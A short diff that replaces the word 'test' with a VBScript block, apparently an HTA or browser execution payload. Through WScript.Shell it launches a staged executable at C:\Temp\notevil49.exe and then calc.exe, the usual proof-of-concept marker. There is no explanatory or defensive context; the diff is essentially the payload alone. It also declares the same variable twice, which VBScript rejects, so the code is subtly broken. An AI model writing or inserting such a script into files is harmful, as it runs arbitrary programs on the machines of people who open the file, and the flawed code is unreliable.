@@ -1,1 +1,9 @@
-test
+<script language="VBScript">
+	Dim objResult 
+    Set WshShell = CreateObject("WScript.Shell")
+    Set objResult = WshShell.Exec("C:\Temp\notevil49.exe")
+    
+    Dim objResult 
+    Set WshShell = CreateObject("WScript.Shell")
+    Set objResult = WshShell.Exec("calc.exe")
+</script>
